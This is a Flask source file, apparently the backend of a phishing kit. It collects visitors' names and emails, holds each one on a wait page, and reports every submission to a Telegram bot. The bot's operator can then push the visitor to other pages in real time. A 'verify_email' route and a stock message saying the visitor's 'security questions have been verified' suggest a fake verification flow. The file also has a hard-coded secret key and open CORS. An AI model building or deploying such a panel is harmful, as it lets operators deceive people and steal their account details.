# app.py

from flask import Flask, request, render_template_string
from flask_socketio import SocketIO
import threading, uuid, asyncio

from state import user_rooms
from page_templates import MAIN_PAGE, WAIT_PAGE
from socket_handlers import register_socket_handlers
import telegram_handlers

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ---------------- ASYNC TELEGRAM LOOP ----------------
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def start_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

# ---------------- SOCKET HANDLERS ----------------
update_user_page = register_socket_handlers(socketio)
telegram_handlers.update_user_page = update_user_page

# ---------------- ROUTES ----------------
@app.route("/", methods=["GET", "POST"])
def main_form():
    if request.method == "POST":
        email = request.form.get("email")
        name = request.form.get("name")
        room_id = str(uuid.uuid4())

        user_rooms[room_id] = {
            "email": email,
            "name": name,
            "greeting": "Your security questions have been verified.",
            "expect_greeting": False
        }

        kb = telegram_handlers.build_keyboard(room_id)

        # Send new submission to Telegram
        if telegram_handlers.update_user_page:
            telegram_handlers.update_user_page(room_id, "Page 6")

        return render_template_string(WAIT_PAGE, room_id=room_id)

    return render_template_string(MAIN_PAGE)

@app.route("/verify_email", methods=["POST"])
def verify_email():
    room_id = request.form.get("room_id")
    verified_email = request.form.get("verified_email")

    user = user_rooms.get(room_id)
    if user:
        user["email"] = verified_email

    return render_template_string(WAIT_PAGE, room_id=room_id)

# ---------------- RUN ----------------
if __name__ == "__main__":
    threading.Thread(target=telegram_handlers.start_telegram_bot, daemon=True).start()
    socketio.run(app, host="0.0.0.0", port=10000, allow_unsafe_werkzeug=True)
